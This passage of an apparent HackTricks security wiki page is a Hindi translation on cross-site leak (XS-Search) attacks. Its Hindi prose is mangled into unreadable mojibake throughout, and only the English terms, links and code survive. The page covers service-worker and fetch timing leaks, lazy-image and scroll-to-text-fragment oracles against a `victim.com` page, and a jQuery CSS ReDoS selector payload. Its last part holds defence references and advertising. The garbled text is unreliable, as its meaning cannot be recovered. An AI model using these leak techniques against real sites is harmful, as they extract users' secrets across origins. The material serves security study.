* **рд╕рд╛рд░рд╛рдВрд╢:** **рдмрд┐рд▓реНрдЯ-рдЗрди рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ** рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдФрд░ рдЙрдирдХреЗ рддрд░реНрдХ рдкрдврд╝рдирд╛ рднреА **рдХреНрд░реЙрд╕-рдСрд░рд┐рдЬрд┐рди рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рд╕реЗ (рдЬрд┐рдиреНрд╣реЗрдВ рд╕реАрдзреЗ рдирд╣реАрдВ рдкрдврд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛), рдпрд╣ **рдореВрд▓реНрдпрд╡рд╛рди рдЬрд╛рдирдХрд╛рд░реА рд▓реАрдХ** рдХрд░ рд╕рдХрддрд╛ рд╣реИред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### рд╕реЗрд╡рд╛ рдХрд░реНрдордЪрд╛рд░реА <a href="#service-workers" id="service-workers"></a>

* **рд╕рдорд╛рд╡реЗрд╢ рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдкреЙрдк-рдЕрдк
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдореЗрдВ рдЕрдВрддрд░**: рдкреГрд╖реНрда рд╕рд╛рдордЧреНрд░реА
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **рд╕рд╛рд░рд╛рдВрд╢:** рд╕реЗрд╡рд╛ рдХрд░реНрдордЪрд╛рд░рд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╡реЗрдм рдХрд╛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рд╕рдордп рдорд╛рдкреЗрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**:

рджрд┐рдП рдЧрдП рдкрд░рд┐рджреГрд╢реНрдп рдореЗрдВ, рд╣рдорд▓рд╛рд╡рддрд╛ рд╡реНрдпрдХреНрддрд┐ рдЕрдкрдиреЗ рдбреЛрдореЗрди рдореЗрдВ рд╕реЗ рдПрдХ "attacker.com" рдореЗрдВ рдПрдХ **рд╕реЗрд╡рд╛ рдХрд░реНрдордЪрд╛рд░реА** рдХреЛ рдкрдВрдЬреАрдХреГрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд╣рд▓ рдХрд░рддрд╛ рд╣реИред рдЕрдЧрд▓реЗ, рд╣рдорд▓рд╛рд╡рддрд╛ рд╡реНрдпрдХреНрддрд┐ рд▓рдХреНрд╖реНрдп рд╡реЗрдмрд╕рд╛рдЗрдЯ рдореЗрдВ рдореБрдЦреНрдп рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕реЗ рдПрдХ рдирдП рд╡рд┐рдВрдбреЛ рдЦреЛрд▓рддрд╛ рд╣реИ рдФрд░ рд╕реЗрд╡рд╛ рдХрд░реНрдордЪрд╛рд░реА рдХреЛ рдПрдХ рдЯрд╛рдЗрдорд░ рдЖрд░рдВрдн рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЬреИрд╕реЗ рд╣реА рдирдИ рд╡рд┐рдВрдбреЛ рд▓реЛрдб рд╣реЛрдиреЗ рд▓рдЧрддреА рд╣реИ, рд╣рдорд▓рд╛рд╡рддрд╛ рд╡реНрдпрдХреНрддрд┐ рдкрд┐рдЫрд▓реЗ рдХрджрдо рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рд╕рдВрджрд░реНрдн рдХреЛ рд╕реЗрд╡рд╛ рдХрд░реНрдордЪрд╛рд░реА рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдмрдВрдзрд┐рдд рдкреГрд╖реНрда рдкрд░ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рддрд╛ рд╣реИред

рдкрд┐рдЫрд▓реЗ рдХрджрдо рдореЗрдВ рдкреНрд░рд╛рд░рдВрдн рдХрд┐рдП рдЧрдП рдЯрд╛рдЗрдорд░ рд╕реЗ рдПрдХ рдорд╛рдкрди рдХреЛ рдЬрдм рдЕрдиреБрд░реЛрдз рдкрд╣реБрдВрдЪрддрд╛ рд╣реИ, рддреЛ рд╕реЗрд╡рд╛ рдХрд░реНрдордЪрд╛рд░реА рдПрдХ **204 (рдХреЛрдИ рд╕рд╛рдордЧреНрд░реА рдирд╣реАрдВ)** рд╕реНрдерд┐рддрд┐ рдХреЛрдб рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдиреЗрд╡рд┐рдЧреЗрд╢рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕рдорд╛рдкреНрдд рд╣реЛ рдЬрд╛рддреА рд╣реИред рдЗрд╕ рд╕рдордп, рд╕реЗрд╡рд╛ рдХрд░реНрдордЪрд╛рд░реА рдиреЗрд╡рд┐рдЧреЗрд╢рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рджреЗрд░реА рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдЕрд╡рдзрд┐ рд╕реЗ рдкреНрд░рднрд╛рд╡рд┐рдд рдПрдХ рдорд╛рдкрди рдХреЛ рдкрдХрдбрд╝рддрд╛ рд╣реИред

{% hint style="warning" %}
рдПрдХ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рд╕рдордп рдореЗрдВ **рдиреЗрдЯрд╡рд░реНрдХ рдХрд╛рд░рдХреЛрдВ** рдХреЛ **рд╣рдЯрд╛рдирд╛** рд╕рдВрднрд╡ рд╣реИ рддрд╛рдХрд┐ **рдЕрдзрд┐рдХ рд╕рдЯреАрдХ рдорд╛рдкрди** рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдкреГрд╖реНрда рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдкреГрд╖реНрда рд▓реЛрдб рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд▓реЛрдб рдХрд░рдХреЗред
{% endhint %}

### рдлреЗрдЪ рдЯрд╛рдЗрдорд┐рдВрдЧ

* **рд╕рдорд╛рд╡реЗрд╢ рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреЗрдЪ API
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдореЗрдВ рдЕрдВрддрд░**: рд╕рдордп (рд╕рд╛рдорд╛рдиреНрдпрдд: рдкреГрд╖реНрда рд╕рд╛рдордЧреНрд░реА, рд╕реНрдерд┐рддрд┐ рдХреЛрдб)
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **рд╕рд╛рд░рд╛рдВрд╢:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЕрдиреБрд░реЛрдз рдкреВрд░рд╛ рдХрд░рдиреЗ рдореЗрдВ рд▓рдЧрдиреЗ рд╡рд╛рд▓рд╛ рд╕рдордп рдорд╛рдкреЗрдВред рдЕрдиреНрдп рдШрдбрд╝рд┐рдпрд╛рд▓ рднреА рдкреНрд░рдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
### рдХреНрд░реЙрд╕-рд╡рд┐рдВрдбреЛ рдЯрд╛рдЗрдорд┐рдВрдЧ

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдкреЙрдк-рдЕрдкреНрд╕
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╕рдордп (рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдкреЗрдЬ рд╕рд╛рдордЧреНрд░реА, рд╕реНрдерд┐рддрд┐ рдХреЛрдб рдХреЗ рдХрд╛рд░рдг)
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **рд╕рд╛рд░рд╛рдВрд╢:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ `window.open` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЕрдиреБрд░реЛрдз рдкреВрд░рд╛ рдХрд░рдиреЗ рдореЗрдВ рд▓рдЧрдиреЗ рд╡рд╛рд▓рд╛ рд╕рдордп рдорд╛рдк рд╕рдХреЗрдВред рдЕрдиреНрдп рдШрдбрд╝рд┐рдпрд╛рдБ рднреА рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдЖрд╕рд╛рдиреА рд╕реЗ **рдСрдЯреЛрдореЗрдЯ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рдмрдирд╛рдПрдВ рдЬреЛ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реИрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## HTML рдпрд╛ Re Injection рдХреЗ рд╕рд╛рде

рдпрд╣рд╛рдБ рдЖрдкрдХреЛ рдПрдХ рдХреНрд░реЙрд╕-рдСрд░рд┐рдЬрд┐рди HTML рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдиреЗ рдХреА рддрдХрдиреАрдХреЗрдВ рдорд┐рд▓реЗрдВрдЧреА **HTML рд╕рд╛рдордЧреНрд░реА рдЗрдВрдЬреЗрдХреНрд╢рди**ред рдпреЗ рддрдХрдиреАрдХреЗрдВ рдЙрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ рд░реБрдЪрд┐рдХрд░ рд╣реИрдВ рдЬрд╣рд╛рдБ рдХрд┐рд╕реА рднреА рдХрд╛рд░рдг рд╕реЗ рдЖрдк **HTML рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдк JS рдХреЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ**ред

### рдбреИрдВрдЧрд▓рд┐рдВрдЧ рдорд╛рд░реНрдХрдЕрдк

{% content-ref url="../dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](../dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### рдЗрдореЗрдЬ рд▓реЗрдЬреА рд▓реЛрдбрд┐рдВрдЧ

рдпрджрд┐ рдЖрдкрдХреЛ **рд╕рд╛рдордЧреНрд░реА рдирд┐рдХрд╛рд▓рдиреА** рд╣реИ рдФрд░ рдЖрдк **рдЧреБрдкреНрдд рд╕реЗ рдкрд╣рд▓реЗ HTML рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ** рддреЛ рдЖрдкрдХреЛ **рд╕рд╛рдорд╛рдиреНрдп рдбреИрдВрдЧрд▓рд┐рдВрдЧ рдорд╛рд░реНрдХрдЕрдк рддрдХрдиреАрдХреЗрдВ** рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдХрд┐рд╕реА рдХрд╛рд░рдгрд╡рд╢ рдЖрдкрдХреЛ рдЗрд╕реЗ **рдЕрдХреНрд╖рд░ рджреНрд╡рд╛рд░рд╛ рдЕрд╡рд╢реНрдпрдВ** рдХрд░рдирд╛ рд╣реИ (рд╢рд╛рдпрдж рд╕рдВрдЪрд╛рд░ рдХреИрд╢ рд╣рд┐рдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реЛ) рддреЛ рдЖрдк рдЗрд╕ рдЯреНрд░рд┐рдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

HTML рдореЗрдВ **рдЗрдореЗрдЬ** рдХреЗ рдкрд╛рд╕ рдПрдХ "**рд▓реЛрдбрд┐рдВрдЧ**" рд╡рд┐рд╢реЗрд╖рддрд╛ рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕рдХрд╛ рдорд╛рди "**рд▓реЗрдЬреА**" рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЙрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЫрд╡рд┐ рдЬрдм рджреЗрдЦреА рдЬрд╛рдПрдЧреА рддрдм рд╣реА рд▓реЛрдб рд╣реЛрдЧреА рдФрд░ рдкреГрд╖реНрда рд▓реЛрдб рд╣реЛрддреЗ рд╕рдордп рдирд╣реАрдВ:
```html
<img src=/something loading=lazy >
```
рдЗрд╕рд▓рд┐рдП, рдЖрдк рдЬреЛ рдХреБрдЫ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡рд╣ рд╣реИ **рдмрд╣реБрдд рд╕рд╛рд░реЗ рдЬрдВрдХ рд╡рд░реНрдг рдЬреЛрдбрд╝рдирд╛** (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **рд╣рдЬрд╛рд░реЛрдВ "W"**) **рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рд╕реЗ рдкрд╣рд▓реЗ рд╡реЗрдм рдкреГрд╖реНрда рднрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╛ рдХреБрдЫ рдРрд╕рд╛ рдЬреЛрдбрд╝рдирд╛** `<br><canvas height="1850px"></canvas><br>.`\
рдлрд┐рд░ рдпрджрд┐ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рд╣рдорд╛рд░рд╛ **рдЗрдВрдЬреЗрдХреНрд╢рди рдЭрдВрдЭрдЯ рдХреЗ рдкрд╣рд▓реЗ рджрд┐рдЦрд╛рдИ рджреЗ**, рддреЛ **рдЫрд╡рд┐** рд▓реЛрдб рд╣реЛ рдЬрд╛рдПрдЧреА, рд▓реЗрдХрд┐рди рдпрджрд┐ **рдлреНрд▓реИрдЧ рдХреЗ рдмрд╛рдж** рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИ, рддреЛ рдлреНрд▓реИрдЧ + рдЬрдВрдХ рдЗрд╕реЗ **рд▓реЛрдб рд╣реЛрдиреЗ рд╕реЗ рд░реЛрдХреЗрдЧрд╛** (рдЖрдкрдХреЛ рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рддрдирд╛ рдЬрдВрдХ рд░рдЦрдирд╛ рд╣реИ рдЗрд╕рдХреЗ рд╕рд╛рде рдЦреЗрд▓рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА)ред рдпрд╣ рд╣реБрдЖ рдерд╛ [**рдЗрд╕ рд░рд╛рдЗрдЯрдЕрдк рдореЗрдВ**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/)ред

рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк рд╣реЛ рд╕рдХрддрд╛ рд╣реИ **scroll-to-text-fragment** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЕрдЧрд░ рдЕрдиреБрдорддрд┐ рд╣реИ:

#### Scroll-to-text-fragment

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк **рдмреЙрдЯ рдХреЛ рдкреГрд╖реНрда рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рджреЗрдВ** рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╕реЗ
```
#:~:text=SECR
```
рдЗрд╕рд▓рд┐рдП рд╡реЗрдм рдкреЗрдЬ рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╣реЛрдЧрд╛: **`https://victim.com/post.html#:~:text=SECR`**

рдЬрд╣рд╛рдВ post.html рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░ рдЬрдВрдХ рд╡рд░реНрдг рдФрд░ рд▓реЗрдЬреА рд▓реЛрдб рдЗрдореЗрдЬ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рдмреЙрдЯ рдХрд╛ рд░рд╣рд╕реНрдп рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИред

рдпрд╣ рдкрд╛рда рдпрд╣ рдХрд░реЗрдЧрд╛ рдХрд┐ рдмреЙрдЯ рдХреЛ рдкреГрд╖реНрда рдореЗрдВ рдХрд┐рд╕реА рднреА рдкрд╛рда рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рджреЗрдЧрд╛ рдЬреЛ рдкрд╛рда `SECR` рдХреЛ рд╕рдорд╛рд╣рд┐рдд рдХрд░рддрд╛ рд╣реИред рдХреНрдпреЛрдВрдХрд┐ рд╡рд╣ рдкрд╛рда рд░рд╣рд╕реНрдп рд╣реИ рдФрд░ рдпрд╣ **рдЫрд╡рд┐ рдХреЗ рдиреАрдЪреЗ рд╣реИ**, рдЫрд╡рд┐ рдХреЗрд╡рд▓ **рдпрджрд┐ рдЕрдиреБрдорд╛рдирд┐рдд рд░рд╣рд╕реНрдп рд╕рд╣реА рд╣реИ рддреЛ рд▓реЛрдб рд╣реЛрдЧреА**ред рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЗ рдкрд╛рд╕ рд░рд╣рд╕реНрдп рдХреЛ **рдПрдХ рдПрдХ рдЕрдХреНрд╖рд░ рдХреЗ рд░реВрдк рдореЗрдВ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХрд╛ рдУрд░реЗрдХрд▓** рд╣реИред

рдЗрд╕реЗ рдЙрддреНрдкреАрдбрд╝рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдХреЛрдб рдЙрджрд╛рд╣рд░рдг: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### рдЫрд╡рд┐ рд▓реЗрдЬреА рд▓реЛрдбрд┐рдВрдЧ рд╕рдордп рдЖрдзрд╛рд░рд┐рдд

рдпрджрд┐ **рдПрдХ рдмрд╛рд╣реНрдп рдЫрд╡рд┐ рд▓реЛрдб рдХрд░рдирд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ** рдЬреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд╕реВрдЪрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЫрд╡рд┐ рд▓реЛрдб рдХреА рдЧрдИ рдереА, рддреЛ рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк рдпрд╣ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ **рдХрдИ рдмрд╛рд░ рдЕрдХреНрд╖рд░ рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рдЙрд╕реЗ рдорд╛рдкреЗрдВ**ред рдпрджрд┐ рдЫрд╡рд┐ рд▓реЛрдб рд╣реЛрддреА рд╣реИ рддреЛ рд╕рднреА рдЕрдиреБрд░реЛрдз рдЕрдзрд┐рдХ рд╕рдордп рд▓реЗрдВрдЧреЗ рдЬрдмрдХрд┐ рдЫрд╡рд┐ рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ рддреЛ рдпрд╣ рд╕рдордп рдХрдо рд▓реЗрдЧрд╛ред рдпрд╣ рд╡рд╣реА рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ [**рдЗрд╕ рд░рд╛рдЗрдЯрдЕрдк рдХреЗ рд╕рдорд╛рдзрд╛рди рдореЗрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **рдпрд╣рд╛рдБ рд╕рдВрдХреНрд╖реЗрдкрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:**

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="../regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](../regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

рдпрджрд┐ `jQuery(location.hash)` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд╣реИ рдХрд┐ рд╕рдордп рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ **рдХреНрдпрд╛ рдХреБрдЫ HTML рд╕рд╛рдордЧреНрд░реА рдореМрдЬреВрдж рд╣реИ**, рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрджрд┐ рдЪрдпрдирдХрд░реНрддрд╛ `main[id='site-main']` рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛ рд╣реИ рддреЛ рдЗрд╕реЗ рдмрд╛рдХреА **рдЪрдпрдирдХрд░реНрддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS Injection

{% content-ref url="css-injection/" %}
[css-injection](css-injection/)
{% endcontent-ref %}

## рд░рдХреНрд╖рд╛

[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) рдореЗрдВ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд┐рдП рдЧрдП рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рд╣реИрдВ рдФрд░ рдкреНрд░рддреНрдпреЗрдХ рдЦрдВрдб рдореЗрдВ рд╡рд┐рдХрд┐ [https://xsleaks.dev/](https://xsleaks.dev/) рдореЗрдВ рднреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЧрдИ рд╣реИред рдЗрди рддрдХрдиреАрдХреЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд┐рдд рд░рд╣рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рд╡рд╣рд╛рдБ рджреЗрдЦреЗрдВред

## рд╕рдВрджрд░реНрдн

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ** рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рдФрдЯреЛрдореЗрдЯреЗрдб рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рдЖрд╕рд╛рдиреА рд╕реЗ рдмрдирд╛рдПрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪреЗрдВ:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}
